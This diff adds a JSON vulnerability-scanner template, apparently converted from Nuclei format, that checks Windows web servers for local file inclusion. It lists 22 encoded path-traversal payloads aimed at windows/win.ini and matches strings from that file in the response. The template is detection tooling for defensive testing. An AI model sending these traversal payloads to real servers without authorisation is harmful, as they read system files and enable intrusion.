@@ -1,0 +1,175 @@
+{
+  "id": "generic-windows-lfi",
+  "name": "Windows - Local File Inclusion",
+  "author": "mesaglio,sushantkamble,ritikchaddha",
+  "severity": "HIGH",
+  "description": "Windows is vulnerable to local file inclusion because of searches for /windows/win.ini on passed URLs.\n",
+  "tags": [
+    "azure",
+    "windows",
+    "lfi",
+    "generic"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {
+    "paths": [
+      "/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini",
+      "/./../../../../../../../../../../windows/win.ini",
+      "/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini",
+      "/.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./windows/win.ini",
+      "/%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2ewindows/win.ini",
+      "/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini",
+      "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini",
+      "/?redirect\u003d..%2f..%2f..%2f..%2fwindows/win.ini",
+      "/?page\u003d..%2f..%2f..%2f..%2f..%2fwindows/win.ini",
+      "/?url\u003d..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini",
+      "/..///////..////..//////windows/win.ini",
+      "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini",
+      "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini",
+      "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini%00",
+      "/index.php?page\u003dwindows/win.ini",
+      "/index.php?page\u003dwindows/win.ini%00",
+      "/index.php?page\u003d../../windows/win.ini",
+      "/index.php?page\u003d....//....//windows/win.ini",
+      "/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini",
+      "/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/windows/win.ini",
+      "/../../../../../../../../../windows/win.ini",
+      "/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini"
+    ]
+  },
+  "variablesType": "sniper",
+  "cweId": "CWE-22",
+  "cvssScore": "7.5",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}{{paths}}",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "bit app support",
+            "fonts",
+            "extensions"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": true,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "generic-windows-lfi",
+    "info": {
+      "name": "Windows - Local File Inclusion",
+      "author": "mesaglio,sushantkamble,ritikchaddha",
+      "severity": "high",
+      "description": "Windows is vulnerable to local file inclusion because of searches for /windows/win.ini on passed URLs.\n",
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "cvss_score": "7.5",
+        "cwe_id": "CWE-22"
+      },
+      "metadata": {
+        "max_request": 22
+      },
+      "tags": "azure,windows,lfi,generic"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "paths": [
+            "/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini",
+            "/./../../../../../../../../../../windows/win.ini",
+            "/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini",
+            "/.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./windows/win.ini",
+            "/%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2ewindows/win.ini",
+            "/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini",
+            "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini",
+            "/?redirect\u003d..%2f..%2f..%2f..%2fwindows/win.ini",
+            "/?page\u003d..%2f..%2f..%2f..%2f..%2fwindows/win.ini",
+            "/?url\u003d..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini",
+            "/..///////..////..//////windows/win.ini",
+            "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini",
+            "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini",
+            "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini%00",
+            "/index.php?page\u003dwindows/win.ini",
+            "/index.php?page\u003dwindows/win.ini%00",
+            "/index.php?page\u003d../../windows/win.ini",
+            "/index.php?page\u003d....//....//windows/win.ini",
+            "/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini",
+            "/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/windows/win.ini",
+            "/../../../../../../../../../windows/win.ini",
+            "/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini"
+          ]
+        },
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}{{paths}}"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "bit app support",
+              "fonts",
+              "extensions"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
